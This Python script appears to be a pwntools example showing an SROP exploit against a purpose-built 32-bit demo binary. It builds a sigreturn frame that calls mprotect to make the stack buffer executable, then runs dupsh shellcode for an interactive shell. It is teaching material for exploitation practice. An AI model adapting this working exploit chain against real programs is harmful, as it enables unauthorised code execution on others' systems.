#!/usr/bin/python3

"""
A set of examples that demonstrate how to mount an SROP attack
using pwntools/binjitsu.
Example tested on :
    Distributor ID:Ubuntu
    Description:Ubuntu 13.10
    Release:13.10
    Codename:saucy
    Linux z-VirtualBox 3.11.0-26-generic #45-Ubuntu SMP Tue Jul 15 04:04:15 UTC 2014 i686 i686 i686 GNU/Linux
"""

import os
import sys

from pwn import *

# Turn of all logging
context.log_level = 10000
context.clear(arch='i386', kernel='amd64')

"""
Example 1:
    Getting a shell from a binary that has an information leak.
    The binary is linked with libc.
    This example shows basic srop capabilities.
"""
def exploit():
    PAGE_SIZE     = 4096

    e = ELF('poc-32')

    p = process("./poc-32")
    # p = process(["strace", "-o", "strace.out", "./poc-32"])
    gdb.attach(p)
    c = constants

    # We receive the "leaked" address of our input buffer
    p.recvuntil(b"Buffer = ")
    buff_addr_bytes = p.recvline()[:-1]
    print("Buff_addr = ", buff_addr_bytes)
    buffer_address = int(buff_addr_bytes, 16)
    buffer_page    = buffer_address & ~(PAGE_SIZE - 1)
    # print("0x%X" % buffer_address)

    # Addresses of the gadgets we use to mount the attack
    INT_80        = e.symbols["make_syscall"]
    POP_ESP_RET   = e.symbols["set_stackptr"]
    POP_EAX_RET   = e.symbols["set_eax"]
    exit_func = e.symbols["exit"]

    sploit  = b""
    sploit += pack(POP_EAX_RET)
    print(c.linux.i386.SYS_sigreturn)
    sploit += pack(c.linux.i386.SYS_sigreturn)
    sploit += pack(INT_80)

    s = SigreturnFrame(arch='i386', kernel='amd64')

    s.eax = constants.linux.i386.SYS_mprotect                      # syscall number
    s.ebx = buffer_page                                 # page containing buffer
    s.ecx = PAGE_SIZE                                   # page size
    s.edx = c.PROT_READ | c.PROT_WRITE | c.PROT_EXEC    # prot
    s.ebp = buffer_page                                 # valid value for ebp
    s.eip = INT_80                                      # syscall instruction

    # At the offset 92, we have an address that points to our
    # shellcode. The shellcode resides at offset 84.
    s.esp = buffer_address + 92
    print(s)
    print(hex(buffer_page))

    # frame = SigreturnFrame()
    # frame.eax = constants.linux.i386.SYS_execve
    # frame.edi = buffer_address + 92
    # frame.ebx = buffer_address + 92
    # frame.ecx = buffer_page
    # frame.edx = buffer_page
    # frame.esp = buffer_address + 92
    # frame.ebp = buffer_page
    # frame.eip = INT_80 # unpack(b"AAAA") #INT_80

    sploit += bytes(s) #.get_frame()
    # sploit += b"/bin/sh\x00"
    # sploit += cyclic(0x200)
    # p.sendline(sploit)

    # p.interactive()
    # return


    # The address of the shellcode
    sploit += pack(buffer_address+96)

    # Our shellcode
    sploit += asm(shellcraft.i386.dupsh())
    print(sploit)

    # Register state :
    # EBP: 0xbffffb58 ("jaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaaf")
    # ESP: 0xbffffb50 ("haafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaaf")
    # EIP: 0x66616167 ('gaaf')
    # [-------------------------------------code-------------------------------------]
    # Invalid $PC address: 0x66616167
    eip_offset = cyclic_find("gaaf")

    # 524 bytes to get to the base pointer. Then we give the
    # base pointer a valid value i.e. `buffer_page`
    sploit += b"\x90" * (eip_offset - 4 - len(sploit))
    sploit += pack(buffer_page)
    sploit += pack(POP_ESP_RET)
    sploit += pack(buffer_address)   # Buffer address

    p.send(sploit)
    p.interactive()

exploit()
